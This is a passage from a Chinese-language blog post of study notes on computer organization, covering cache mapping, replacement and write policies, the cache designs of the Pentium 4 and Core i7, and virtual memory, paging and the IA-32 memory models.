fault），因为块和页面是这些层次之间传送信息的单位。</p><p><code>缺页错付出的时间代价要比块缺失付出的更大。</code></p><p><strong>存储体系设计的目标：</strong>使Teff接近于M1的t1，总成本接近于Mn的成本。</p><h3 id="cache基本原理"><a href="#cache基本原理" class="headerlink" title="cache基本原理"></a>cache基本原理</h3><h4 id="cache的功能"><a href="#cache的功能" class="headerlink" title="cache的功能"></a>cache的功能</h4><p>根据程序访问的局部性原理，可以在主存和CPU之间设置一个<code>高速</code>的容量<code>相对较小</code>的存储器，如果当前正在执行的程序和数据存放在这个存储器中，在程序运行时，不必从主存储器取指令和取数据，只需访问这个高速存储器，以提高程序运行速度。这个存储器称作高速缓冲存储器<code>cache</code></p><p><code>cache由高速的SRAM组成</code>，它的工作速度数倍于主存，全部功能由<code>硬件</code>实现，并且对程序员是<code>透明</code>的</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/cache%E5%8A%9F%E8%83%BD.png" class=""><p>cache概念：</p><ol><li>CPU与主存储器之间的一种高速缓冲装置；</li><li>cache -主存层次结构：由硬件变换地址和控制调度</li></ol><p>cache特点：</p><ol><li>位于CPU与主存之间，是存储器层次结构中级别最高的一级；</li><li>容量比主存小，目前一般有数KB到数MB；</li><li>速度一般比主存快5-10倍，通常由存储速度高的双极型三极管或SRAM组成；</li><li>其内容是主存的部分副本；</li><li>其用途可用来存放指令，也可用来存放数据；</li><li>快存的功能全部由硬件实现，并对程序员透明</li></ol><h4 id="cache的基本原理"><a href="#cache的基本原理" class="headerlink" title="cache的基本原理"></a>cache的基本原理</h4><p><code>cache的设计依据</code>：CPU这次访问过的数据，下次有很大的可能也是访问附近的数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CPU与cache之间的数据传送是以字为单位</span><br><span class="line">主存与cache之间的数据传送是以块为单位。</span><br><span class="line">CPU读主存时，把地址同时送给cache和主存</span><br><span class="line">cache控制逻辑依据地址判断此字是否在cache中，若在，此字立即传送给CPU 。</span><br><span class="line">否则，则用主存读周期把此字从主存读出送到CPU，同时，把含有这个字的整个数据块从主存读出送到cache中</span><br></pre></td></tr></table></figure><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/cache%E8%AE%BE%E8%AE%A1%E4%BE%9D%E6%8D%AE.png" class=""><ol><li>图中cache分为4行，每行4个字</li><li>分配给cache的地址存放在一个<code>相联存储器CAM</code>中，它是<code>按内容寻址</code>的存储器。</li><li>当CPU执行访存指令时，把待访问的字的地址送到CAM中，立刻就可以知道该字命中与否</li><li>如果该字不在cache中，则将该字从主存传送到CPU。同时，把该字所在的整个数据块送入cache</li><li>cache未命中时使用LRU替换策略，即替换最近最少使用的一行数据。 </li></ol><h4 id="cache的命中率"><a href="#cache的命中率" class="headerlink" title="cache的命中率"></a>cache的命中率</h4><p>任何时候都有一些主存块处在cache中。</p><p>当CPU发出读请求时，将主存地址s位（或s位中的一部分）与cache某块的标记相比较，根据其比较结果是否相等而区分出两种情况：</p><ol><li>当比较结果相等时，说明需要的数据已在cache中，直接访问cache就行了，在CPU与cache之间，通常一次传送一个字；<code>cache命中</code></li><li>当比较结果不相等时，说明需要的数据尚未调入cache，那么就要把该数据所在的整个字块从主存一次调进来；<code>cache不命中</code></li></ol><p><code>命中率</code>指CPU所要访问的信息在cache中的比率；而将所要访问的信息不在cache中的比率称为<code>失效率</code>或<code>未命中率</code>。 </p><p><code>增加cache的目的</code>，就是在<code>性能上使主存的平均读出时间尽可能接近cache的读出时间</code>。因此，<code>cache的命中率应接近于1</code>。由于程序访问的局部性原理，这是可能的</p><p>在一个程序执行期间：<br>设Nc表示cache完成存取的总次数，Nm表示主存完成存取的总次数，h定义为命中率，则有：<code>h = &quot;Nc&quot; /&quot;Nc+Nm&quot;</code></p><p>若 tc表示命中时的cache访问时间，tm表示未命中时的主存访问时间，1-h表示未命中率，则cache/主存系统的平均访问时间ta为：<code>ta=htc+(1-h)tm</code></p><p><strong>目标</strong>：以较小的硬件代价使<code>cache/主存系统</code>的平均访问时间ta越接近tc越好</p><p>设<code>r=tm/tc</code>表示<code>主存慢于cache的倍率</code>，e表示访问效率<br><code>e = &quot;tc&quot; /&quot;ta&quot;  = &quot;tc&quot; /&quot;htc+(1−h)tm&quot; = 1/&quot;h+(1−h)r&quot;=&quot;1&quot; /&quot;r+(1−r)h&quot;</code></p><p>为提高访问效率：<code>命中率h越接近1越好，r值以5-10为宜，不宜太大</code></p><p>cache的<code>容量</code>和<code>块长</code>是影响cache的效率的重要因素</p><ol><li>cache容量是总成本价与命中率的折中值</li><li>通常：每块取4至8个可编址单位（字或字节）较好；也可取一个主存周期所能调出主存的信息长度。</li></ol><h3 id="cache结构设计必须解决的问题"><a href="#cache结构设计必须解决的问题" class="headerlink" title="cache结构设计必须解决的问题"></a>cache结构设计必须解决的问题</h3><p>基本结构由<code>cache存储体</code>、<code>地址映射变换机构</code>、<code>cache替换机构</code>几大模块组成</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/cache%E5%AD%98%E5%82%A8%E5%99%A8.png" class=""><h4 id="地址映射（映象）与地址变换"><a href="#地址映射（映象）与地址变换" class="headerlink" title="地址映射（映象）与地址变换"></a>地址映射（映象）与地址变换</h4><p><code>地址映射</code>：把主存块按照某种规则（函数或方法）装入或定位到cache中的过程。<br><code>地址变换</code>：信息按这种映射关系装入cache后，执行程序时，将主存地址变换成 cache地址的变换过程叫做<code>地址变换</code>。<br><code>地址映射</code>和<code>地址变换</code>密切相关。 　</p><p>基本的地址映射方式：<code>全相联映射</code>；<code>直接映射</code>；<code>组相联映射</code><br><code>主存空间划分成大小相等的主存块（Block</code>），cache中存放一个主存块的对应单位称为<code>槽（Slot）</code>或<code>行（line）</code>，有的书中也称之为<code>块（Block）</code></p><ol><li>全相联映射<br>主存中的任何一个块均可以映射装入到Cache中任何一个块的位置上，比较灵活，Cache的块冲突概率最低、空间利用率最高，但是地址变换速度慢，成本高，实现困难。</li><li>直接映射<br>主存中的每一个块只能被放置到Cache中唯一的一个指定位置，若这个位置已有内容，则产生块冲突，原来的块被无条件替换出去。<br>直接映射是最简单的地址映射方式，成本低，易实现，地址变换速度块，但该方法不够灵活，Cache的块冲突概率最高、空间利用率最低。<br>cache的第i块和主存的第j块有如下函数关系<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i &#x3D; j mod m ( m为cache的总块数）</span><br><span class="line">i &#x3D; 0,1,2,…,m-1          </span><br><span class="line">j &#x3D; 0,1,2,…,n-1</span><br></pre></td></tr></table></figure></li><li>组相联映射<br>是全相联映射和直接映射的折中方案，其优点和缺点介于全相联和直接映射方式之间。<br>主存中的各块与cache的组号有固定的映射关系，但可以自由映射到对应的cache组中的任一块<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">把cache字块分为u组，每组v块，则cache的总块数为：m&#x3D;u*v</span><br><span class="line">若j为主存块号，i为cache块号，q为组号，q&#x3D;0,1,2,…,u-1</span><br><span class="line">按u为模将其映射到cache，那么，主存字块可以用下列映射函数映射到cache的第u组内：q &#x3D; j  mod  u</span><br><span class="line">凡是符合以上求模公式的主存j块，均会映射到cache的u组内</span><br><span class="line">主存块存放到哪个组是固定的，至于存到该组的那一行是灵活的</span><br><span class="line">v值越大越灵活，而v值越小相联搜索的规模越小，v通常取2、4、8、16，称为v路组相联cache</span><br></pre></td></tr></table></figure>cache和主存机械等分为<code>相同大小的块</code>，每一块是由若干个字（或字节）组成。 </li></ol><h4 id="替换策略"><a href="#替换策略" class="headerlink" title="替换策略"></a>替换策略</h4><p>当一个新的主存块要调入到cache，而允许存放此块的行位置都被其它主存块占满时，就要产生替换，因为<code>cache工作原理要求它尽量保存最新的数据</code></p><p><code>替换问题与cache的组织方式紧密相关：</code></p><ol><li>对于采用直接映射的cache来说，因一个主存块只有一个特定的行位置可存放，所以问题解决很简单，把此特定行位置上的原主存块妥善处理后，换出cache即可。</li><li>对于全相联映射的cache来说，它的全部行都是可被替换的特定行。</li><li>而组相联映射的cache中同组各路的行都是可被替换的特定行，这样就要从允许存放新主存块的若干特定行中选取一行换出。</li></ol><p><strong>LFU（最不经常使用 ）算法</strong><br><code>将一段时间内被访问次数最少的那行数据换出</code><br>每行设置一个计数器，新行建立后从0开始计数<br>每访问一次，被访问的行计数器增加1<br>当需要替换时，对这些特定行的计数值进行比较，将计数值最小的行换出，同时将这些行的计数器清零<br><code>缺点</code>：不能反映近期cache的访问情况</p><p><strong>LRU（近期最少使用）算法</strong><br><code>将近期内长久未被访问过的行换出</code><br>每行设置一个计数器，cache每命中一次，命中行计数器清零，其它各行计数器增1。该计数器是未访问次数计数器。当需要替换时，比较各特定行的计数值，<code>将计数值最大的行换出</code></p><p>这种算法<code>保护了刚拷贝到cache中的新数据行</code>，符合cache工作原理，因而使cache有较高的命中率。</p><p><strong>随机替换</strong><br>从特定的行位置中随机地选取一行换出即可。<br>硬件实现最容易，而且速度也比前两种策略快</p><p><code>缺点</code>：随意换出的数据很可能马上又要用，从而增加了映射次数，降低了命中率和cache 的工作效率<br>这个缺点可以用增大cache的容量来克服。</p><h4 id="写操作策略"><a href="#写操作策略" class="headerlink" title="写操作策略"></a>写操作策略</h4><p><strong>写回法（Write Back）</strong><br>当CPU对cache写命中时，只修改cache的内容，不立即写入主存，<code>只当此行被换出时才写回主存</code><br>对一个cache行的多次写命中都在cache中快速完成修改，只是需被替换时才写回速度较慢的主存，减少了访问主存的次数从而提高了效率。</p><p>方法：<code>每个cache行必须配置一个修改位（通常称为“脏”位）</code>，以反映此行是否被CPU修改过。<br>当某行被换出时，根据此行修改位为1还是为0，决定是将该行内容写回主存还是简单弃去<br>对于<code>cache写未命中</code>，为包含欲写字的主存块在cache分配一行，将此块整个拷贝到cache后在cache中对其进行修改；拷贝主存块时虽已访问到主存，但此时并不对主存块修改，统一地将主存写修改操作留待换出时进行</p><p><code>优点</code>：写cache与写主存分开进行，可显著减少写主存次数。<br><code>缺点</code>：存在cache/主存不一致性的隐患</p><p><strong>全写法（写直通法Write Through）</strong><br><code>当cache写命中时</code>：cache与主存同时发生写修改。这种策略显然较好地维护了cache与主存的内容一致性<br><code>当cache写未命中时</code>：直接向主存写，但此时是否将修改过的主存块取到cache，有两种选择：</p><ol><li>一种是取主存块到cache并为它分配一个行位置；</li><li>另一种是不取主存块到cache。</li></ol><p><code>优点</code>：cache每行无需设置一个修改位以及相应的判测逻辑。<br><code>缺点</code>：cache对CPU向主存的写操作无高速缓存功能，降低了cache的功效</p><p><strong>写一次法</strong><br>一种基于写回法又结合了全写法的写策略，即写命中和写未命中的处理与写回法基本相同，只是<code>第一次写命中时要同时写入主存</code><br>在第一次片内cache写命中时， CPU在总线上启动一个存储器写周期。其他cache监听到此主存块地址及写信号后，即可把它们各自保存可能有的该块拷贝及时作废（无效处理），<code>便于维护系统全部cache的一致性</code></p><h3 id="Pentium-4的cache组织"><a href="#Pentium-4的cache组织" class="headerlink" title="Pentium 4的cache组织"></a>Pentium 4的cache组织</h3><h4 id="Pentium-PC采用两级cache结构"><a href="#Pentium-PC采用两级cache结构" class="headerlink" title="Pentium PC采用两级cache结构"></a>Pentium PC采用两级cache结构</h4><p><code>L1cache</code> —— 集成在CPU内，其容量是16KB，采用的也是两路组相联映射方式，每行是32字节<br>CPU中的L1cache分为各8KB的指令cache和数据cache</p><ol><li>指令cache是只读的，单端口256位（32字节）向指令预取缓冲器提供指令代码。</li><li>数据cache是读写的，双端口，每端口32位（4字节），向两条流水线的整数运算单元和寄存器提供数据或接收数据，两个端口还可组合成一个64位端口与浮点运算单元相接</li><li>两个cache与64位数据、32位地址的CPU内部总线相连<br><code>L2cache</code> —— 安装在主板上，其容量是256 KB或512KB，采用的两路组相联映射方式，每行可以是32，64或128字节。<br>L2的内容是4～32MB容量主存的子集，L1又是L2的子集，从而使L1未命中处理时间大为缩短，为L1的高速使用提供了支持</li></ol><h4 id="Pentium4的三级cache组织"><a href="#Pentium4的三级cache组织" class="headerlink" title="Pentium4的三级cache组织"></a>Pentium4的三级cache组织</h4><ol><li>取指/译码单元：顺序从L2 cache中取程序指令，将它们译成一系列的微指令，并存入L1指令cache中。</li><li>乱序执行逻辑：依据数据相关性和资源可用性，调度微指令的执行，因此微指令可按不同于所取机器指令流的顺序被调度执行</li><li>执行单元：执行微指令，从L1数据cache中取所需数据，并在寄存器组中暂存运算结果。</li><li>存储器子系统：这部分包括L2 cache、L3 cache和系统总线。当L1、L2cache未命中时，使用系统总线访问主存。系统总线还用于访问I/O资源。<img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/Pentium4%E7%9A%84%E4%B8%89%E7%BA%A7cache%E7%BB%84%E7%BB%87.png" class="">Pentium 4的指令cache位于指令译码逻辑和执行部件之间。<br><code>设计理念</code>：Pentium 4将机器指令译成由微指令组成的简单RISC类指令，而使用简单定长的微指令可允许采用超标量流水线和调度技术，从而增强机器的性能。</li></ol><h4 id="Intel-Core-i7处理器的cache结构"><a href="#Intel-Core-i7处理器的cache结构" class="headerlink" title="Intel Core i7处理器的cache结构"></a>Intel Core i7处理器的cache结构</h4><p>每个核内有各自私有的L1cache和L2cache<br>其中，L1数据cache和指令cache都是32KB数据区，皆为8路组相联，存取时间都是4个时钟周期。<br>L2cache是联合cache，共有256KB数据区，8路组相联，存取时间是11个时钟周期。<br>该多核处理器还有一个供所有核共享的L3cache，其数据区大小为8MB，16路组相联，存取时间是30~40个时钟周期。<br>Intel Core i7中所有cache的块大小都是64B。</p><h2 id="虚拟存储器"><a href="#虚拟存储器" class="headerlink" title="虚拟存储器"></a>虚拟存储器</h2><p>一个用户的程序不再分配连续的内存空间，而是把<code>物理存储器分成多个比较小的存储块，每块的大小相等且长度固定不变</code>，称为<code>页面</code>或<code>页框</code>。<br><code>每个进程所需的存储空间被划分成小的固定长度的程序块</code>，称为<code>页</code>。<br><code>页</code>的长度和<code>页面</code>相等</p><p>分页技术引申出一种非常重要的存储管理策略——<code>虚拟存储器</code>（简称虚存）。<br>在<code>存储管理部件（MMU）</code>的支持下，虚拟存储器技术可以彻底解决存储器的调度与管理问题。</p><h3 id="虚拟存储器的基本概念"><a href="#虚拟存储器的基本概念" class="headerlink" title="虚拟存储器的基本概念"></a>虚拟存储器的基本概念</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p><code>虚拟存储器</code>是<code>建立在主存-辅存（外存）物理结构基础上的</code>，由负责信息划分及主存-辅存之间信息调度的<code>辅助硬件</code>及<code>操作系统的存储管理软件</code>所组成的一种<code>存储体系</code></p><p>将<code>主存和辅存的地址空间统一编址</code>，形成一个庞大的存储空间。在这个大空间里，用户自由编程，<code>完全不必考虑程序在主存中是否装得下，或者放在辅存中的程序将来在主存中的位置</code></p><p>编好的程序由计算机操作系统装入辅助存储器，程序运行时附加的辅助硬件机构和存储管理软件会把辅存的程序一块块自动调入内存由CPU执行或调出内存<br>用户感觉到的不再是处处受到主存容量限制的存储系统，而是好像具有一个容量充分大的存储器，这样的存储体系称为<code>“虚拟存储器”</code></p><p>虚拟存储器只是一个容量非常大的存储器的逻辑模型，不是任何实际的物理存储器。它借助于磁盘等辅助存储器来扩大主存容量，使之为更大或更多的程序所使用。</p><p>虚拟存储器指的是主存-辅存层次。以透明的方式给用户提供了一个比实际主存空间大得多的<code>程序地址空间</code></p><p>它能使计算机具有辅存的容量，而接近于主存的速度</p><h4 id="实地址和虚地址"><a href="#实地址和虚地址" class="headerlink" title="实地址和虚地址"></a>实地址和虚地址</h4><p>虚拟存储器的辅存部分也能让用户象内存一样使用，用户编程时的指令地址允许涉及辅存大小的空间范围，这种指令地址称为<code>“虚拟地址”</code>（虚地址）或<code>“逻辑地址”</code>。对应的存储空间称为<code>“虚存空间”</code>或<code>“逻辑地址空间”</code></p><p>实际的主存储器地址则称为<code>“物理地址”</code>（ 实地址）。它由CPU引脚送出，是用于访问主存的地址。对应的存储空间称为<code>“物理存储空间”</code>或<code>“主存空间”</code></p><p>程序进行虚地址到实地址转换的过程成为程序的<code>再定位</code></p><h4 id="虚存的访问过程"><a href="#虚存的访问过程" class="headerlink" title="虚存的访问过程"></a>虚存的访问过程</h4><p>虚拟存储器的用户程序以虚拟地址编址并存放在辅存中<br>程序运行时，由<code>地址变换机构</code>依据当时分配给该程序的<code>实地址空间</code>把程序的一部分调入实存。<br>每次访存时，首先判断该虚地址所对应的部分是否在实存中：如果是，则进行地址转换并用实地址访问主存；否则，按照某种算法将辅存中的部分程序调度进内存，再按同样的方法访问主存。</p><p><code>虚拟存储器对设计存储管理软件的系统程序员是不透明的，但对应用程序员而言是透明的</code></p><h4 id="cache与虚存的异同"><a href="#cache与虚存的异同" class="headerlink" title="cache与虚存的异同"></a>cache与虚存的异同</h4><p><code>主存-辅存的访问机制</code>与<code>cache-主存的访问机制</code>是<code>类似</code>的</p><p><code>cache-主存之间</code>以及<code>主存-辅存之间</code>分别有<code>辅助硬件</code>和<code>辅助软硬件</code>负责<code>地址变换与管理</code>，以便各级存储器能够组成<code>有机的三级存储体系</code>。<br><code>cache-主存</code>构成了系统的<code>内存</code>，而<code>主存-辅存</code>依靠辅助软硬件的支持构成了<code>虚拟存储器</code><br><strong>相同点</strong></p><ol><li><code>出发点相同</code>：两者都是为了<code>提高存储系统的性价比</code>而构造的<code>分层存储体系</code>，都力图使存储系统的性能接近高速存储器，而价格和容量接近低速存储器。</li><li><code>原理相同</code>：都是利用了程序运行时的<code>局部性原理</code>把<code>最近常用的信息块</code>从<code>相对慢速而大容量的存储器</code>调入<code>相对高速而小容量的存储器</code></li></ol><p><strong>不同点</strong></p><ol><li><code>侧重点不同</code>：cache主要解决<code>主存与CPU的速度差异问题</code>；虚存主要解决<code>存储容量问题</code></li><li><code>数据通路不同</code>：CPU与cache和主存之间<code>均有直接访问通路</code>，cache不命中时可直接访问主存；而虚存所依赖的辅存与CPU之间<code>不存在</code>直接的数据通路，当主存不命中时只能通过调页解决，CPU最终还是要访问主存</li><li><code>透明性不同</code>：cache的管理完全由硬件完成，对系统程序员和应用程序员均透明；而虚存管理由软件（操作系统）和硬件共同完成，对实现存储管理的系统程序员不透明，而对应用程序员透明</li><li><code>未命中时的损失不同</code>：由于主存的存取时间是cache的存取时间的5～10倍，而主存的存取速度通常比辅存的存取速度快上千倍，故主存未命中时系统的性能损失要远大于cache未命中时的损失。</li></ol><h4 id="虚存机制要解决的关键问题"><a href="#虚存机制要解决的关键问题" class="headerlink" title="虚存机制要解决的关键问题"></a>虚存机制要解决的关键问题</h4><ol><li>调度问题：决定哪些程序和数据应被调入主存</li><li>地址映射问题：在访问主存时把虚地址变为主存物理地址；在访问辅存时把虚地址变成辅存的物理地址，以便换页;此外还要解决主存分配、存储保护与程序再定位等问题</li><li>替换问题：决定哪些程序和数据应被调出主存</li><li>更新问题：确保主存与辅存的一致性</li></ol><h3 id="三种虚拟存储器"><a href="#三种虚拟存储器" class="headerlink" title="三种虚拟存储器"></a>三种虚拟存储器</h3><p>虚存通过增设<code>地址映射表机构</code>来实现程序在主存中的<code>定位</code></p><p>这种定位技术是<code>把程序分割成若干个较小的段或页</code>，用相应的映射表机构，来指明<code>该程序的某段或某页是否已装入主存</code>：</p><ol><li>若已装入主存，则应同时指明其在主存中所处的开始位置</li><li>若未装入主存，则应到辅存中去调段或页，并建立起程序空间和实存空间的地址映射关系。这样，程序执行时通过查映射表，将程序（虚）地址变成主存地址再访问主存。</li></ol><p>由于采用的存储映射算法不同，形成了采用多种存储器管理方式的虚拟存储器，其中主要有<code>页式</code>、<code>段式</code>、<code>段页式</code>三种</p><h4 id="页式虚拟存储器"><a href="#页式虚拟存储器" class="headerlink" title="页式虚拟存储器"></a>页式虚拟存储器</h4><h5 id="页式虚存地址映射"><a href="#页式虚存地址映射" class="headerlink" title="页式虚存地址映射"></a>页式虚存地址映射</h5><p>虚地址空间被分成等长大小的页，称为<code>逻辑页</code>；主存空间也被分成同样大小的页，称为<code>物理页</code><br><code>虚地址</code>分为两个字段：<code>高字段为逻辑页号</code>，<code>低字段为页内地址</code>（偏移量）；<code>实存地址</code>也分两个字段：<code>高字段为物理页号</code>，<code>低字段为页内地址</code>。<br>通过页表可以把虚地址（逻辑地址）转换成物理地址</p><h5 id="转换后援缓冲器TLB（快表）"><a href="#转换后援缓冲器TLB（快表）" class="headerlink" title="转换后援缓冲器TLB（快表）"></a>转换后援缓冲器TLB（快表）</h5><p>由于页表通常在主存中，因而即使逻辑页已经在主存中，也至少要访问两次物理存储器才能实现一次访存，这将使虚拟存储器的存取时间加倍。<br>为了避免对主存访问次数的增多，把页表中最活跃的部分存放在高速存储器中，组成快表。这个专用于页表缓存的高速存储部件称为转换后援缓冲器，又称<code>快表</code>（TLB）。保存在主存中的完整页表则称为<code>慢表</code></p><p><code>TLB由按内容查询的相联存储器实现，存储慢表中部分信息的副本。</code></p><h5 id="内页表和外页表"><a href="#内页表和外页表" class="headerlink" title="内页表和外页表"></a>内页表和外页表</h5><p>虚页内容若没有调入主存，则计算机启动输入输出系统，把虚地址指示的一页内容从辅存调入主存，再提供CPU访问。      </p><p>虚地址和辅存地址不是一回事，程序员按虚存空间编址，虚地址由虚页号和页内地址组成。以磁盘为例，辅存实际地址由磁盘机号、磁头号、柱面号、块号、块内地址组成，因此从辅存调页时还需要虚存地址空间到辅存地址的变换。这个变换也可以采用类似前述页表的方式。此表称为外页表。</p><p>CPU访问主存页面失效时，调用<code>外页表</code>把程序的虚地址变换成辅存的实际地址，从辅存调出该虚页，而后根据页表指出实页号再把虚页内容调入主存。</p><p>调入由地址变换机构实现</p><h5 id="虚拟存储器、TLB和cache的协同操作"><a href="#虚拟存储器、TLB和cache的协同操作" class="headerlink" title="虚拟存储器、TLB和cache的协同操作"></a>虚拟存储器、TLB和cache的协同操作</h5><h4 id="段式虚拟存储器"><a href="#段式虚拟存储器" class="headerlink" title="段式虚拟存储器"></a>段式虚拟存储器</h4><p>页式虚拟存储器的信息传送单位是定长的页，<code>优点</code>是页长固定，因而便于构造页表，易于管理，且不存在外碎片。<code>缺点</code>是页长与程序的逻辑大小不相关。</p><p><code>段式虚拟存储器</code>，是<code>以程序的逻辑结构所形成的段（</code>如主程序、子程序、过程、表格等）作为主存分配单位的虚拟存储器。</p><p>段是<code>按照程序的自然分界划分的长度可以动态改变的区域</code>。通常，程序员把子程序、操作数和常数等不同类型的数据划分到不同的段中，并且每个程序可以有多个相同类型的段。</p><p>在段式虚拟存储系统中，虚地址由<code>段号</code>和<code>段内地址</code>（偏移量）组成。虚地址到主存地址的变换通过段表实现。</p><p>段表的每一个表项对应一个段。每个表项至少包含下面三个字段：</p><ol><li>有效位：指明该段是否已经调入实存。</li><li>段起址：指明在该段已经调入实存的情况下，该段在实存中的首地址。</li><li>段长：记录该段的实际长度。设置段长字段的目的是为了保证访问某段的地址空间时，段内地址不会超出该段长度导致地址越界而破坏其他段。</li></ol><p>段表本身也是一个段，一般驻留在主存中。 </p><p>段式虚拟存储器有许多<code>优点</code>：</p><ol><li>段的逻辑独立性使其<code>易于编译、管理、修改和保护，也便于多道程序共享。</code></li><li><code>段长可以根据需要动态改变，允许自由调度，以便有效利用主存空间。</code></li></ol><p>段式虚拟存储器也有一些<code>缺点</code>：</p><ol><li>因为段的长度不固定，<code>主存空间分配比较麻烦</code>。</li><li>容易在段间<code>留下许多外碎片，造成存储空间利用率降低</code>。</li><li>由于段长不一定是2的整数次幂，因而不能简单地像分页方式那样用虚地址和实地址的最低若干二进制位作为段内偏移量，并与段号进行直接拼接，<code>必须用加法操作通过段起址与段内偏移量的求和运算求得物理地址</code>。因此，段式存储管理比页式存储管理方式需要更多的硬件支持。 </li></ol><h4 id="段页式虚拟存储器"><a href="#段页式虚拟存储器" class="headerlink" title="段页式虚拟存储器"></a>段页式虚拟存储器</h4><p>将段式管理和页式管理相结合，就构成了虚存的段页式管理<br>实存被等分成页。每个程序则先按逻辑结构分段，每段再按照实存的页大小分页。<br>。。。。。。</p><h3 id="虚拟存储器的替换算法"><a href="#虚拟存储器的替换算法" class="headerlink" title="虚拟存储器的替换算法"></a>虚拟存储器的替换算法</h3><p>当CPU要用到的数据或指令不在主存时，产生<code>页面失效</code>），此时要从辅存调进包含这条指令或数据的页面</p><ol><li>cache的替换全部靠硬件实现，而虚拟存储器的替换有操作系统的支持。</li><li>虚存缺页对系统性能的影响比cache未命中要大得多，因为调页需要访问辅存，并且要进行任务切换。</li><li>虚存页面替换的选择余地很大，属于一个进程的页面都可替换。</li></ol><p>虚拟存储器中的替换策略一般采用<code>LRU算法</code>、<code>LFU算法</code>、<code>FIFO算法</code>，或将两种算法结合起来使用。<br>…</p><h2 id="Pentium系列机的虚存组织"><a href="#Pentium系列机的虚存组织" class="headerlink" title="Pentium系列机的虚存组织"></a>Pentium系列机的虚存组织</h2><h3 id="存储器模型"><a href="#存储器模型" class="headerlink" title="存储器模型"></a>存储器模型</h3><p>IA-32体系结构微处理机（地址总线的根数为32根）的存储管理硬件支持三种存储器模型：</p><ol><li>平坦存储器模型<br>内存被组织成单一的、连续的地址空间，称为“线性地址空间”。所有的代码、数据和堆栈均包含在该地址空间内，该空间的字节地址范围为0～2^32-1（4GB）。<img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%B9%B3%E5%9D%A6%E5%AD%98%E5%82%A8%E5%99%A8%E6%A8%A1%E5%9E%8B.png" class=""></li><li>分段存储器模型<br>每个程序均使用一组独立的地址空间，每个地址空间就是一个段，段的最大长度为2^32B（4GB）。<br>逻辑地址由段选择器和偏移量组成，处理机将逻辑地址透明地转换为线性地址<img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%88%86%E6%AE%B5%E5%AD%98%E5%82%A8%E5%99%A8%E6%A8%A1%E5%9E%8B.png" class=""></li><li>实地址模式存储器模型<br>这是为保持与早期的8086处理机兼容的存储器模式。<br>线性地址空间被分为段，段的最大长度为64KB。<br>线性地址空间的最大长度为2^20B<img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%AE%9E%E5%9C%B0%E5%9D%80%E6%A8%A1%E5%BC%8F%E5%AD%98%E5%82%A8%E5%99%A8%E6%A8%A1%E5%9E%8B.png" class=""></li></ol><h3 id="虚地址模式"><a href="#虚地址模式" class="headerlink" title="虚地址模式"></a>虚地址模式</h3><p>IA-32体系结构微处理机的虚拟存储器可以通过两种方式实现：<code>分段</code>和<code>分页</code><br>存储管理部件包括<code>分段部件SU</code>和<code>分页部件PU</code></p><p><code>分段部件SU</code>将程序中使用的<code>虚地址转换成线性地址</code>。而<code>分页部件PU</code>则将<code>线性地址转换为物理地址</code>。<br>在分段部件SU和分页部件PU中，每一部分都可以<code>独立打开或关闭</code>，因而有四种组合方式：</p><ol><li>不分段不分页模式<br>程序中使用的逻辑地址与物理地址相同</li><li>分段不分页模式<br>分段不分页的优点：无需访问页目录表和页表，地址转换速度快</li><li>分段分页模式</li><li>不分段分页模式</li></ol><h3 id="分页模式下的地址转换"><a href="#分页模式下的地址转换" class="headerlink" title="分页模式下的地址转换"></a>分页模式下的地址转换</h3><ol><li>4KB分页功能<br>分页机制将内存划分成大小相同的存储块，称为<code>物理页面</code>；<code>每个物理页面大小为4K字节</code>；内存最大4GB的空间可以分为1M（1048576）个页面。<br>如果不允许分页，那么分段机制确定的32位线性地址即为物理地址。<br>如果允许分页，分页机制通过<code>两级页表结构</code>将线性地址转换成物理地址：第一级是<code>页目录表</code>；第二级是<code>页表</code>。</li><li>4MB分页功能<br>页面（页框）大小为4MB的分页方式使用单级页表，减少了一次主存访问，地址转换过程加快了。<br>此方式下，32位线性地址分为高10位的页面（号）和低22位的页内偏移两个字段。<br>32位地址模式下，全系统只有一张页表，由控制寄存器CR3指向。<br>此页表有1K个表项，每项4字节（32位）。</li></ol><h1 id="指令系统"><a href="#指令系统" class="headerlink" title="指令系统"></a>指令系统</h1><h2 id="指令系统的发展与性能要求"><a href="#指令系统的发展与性能要求" class="headerlink" title="指令系统的发展与性能要求"></a>指令系统的发展与性能要求</h2><h3 id="指令系统的发展"><a href="#指令系统的发展" class="headerlink" title="指令系统的发展"></a>指令系统的发展</h3><p>从计算机组成的层次结构来说，计算机的指令有<code>微指令</code>、<code>机器指令</code>和<code>宏指令</code>之分：</p><ol><li>微指令是微程序级的命令，属于硬件；</li><li>宏指令是由若干条机器指令组成的软件指令，属于软件；</li><li><code>机器指令介于微指令与宏指令之间，通常简称为指令</code>，每一条指令可完成一个独立的算术运算或逻辑运算操作</li></ol><p>一台计算机中所有<code>机器指令的集合</code>称为该机的<code>指令系统</code>或<code>指令集</code>。它是程序工作者编制程序的基本依据，也是进行计算机逻辑设计的基本依据 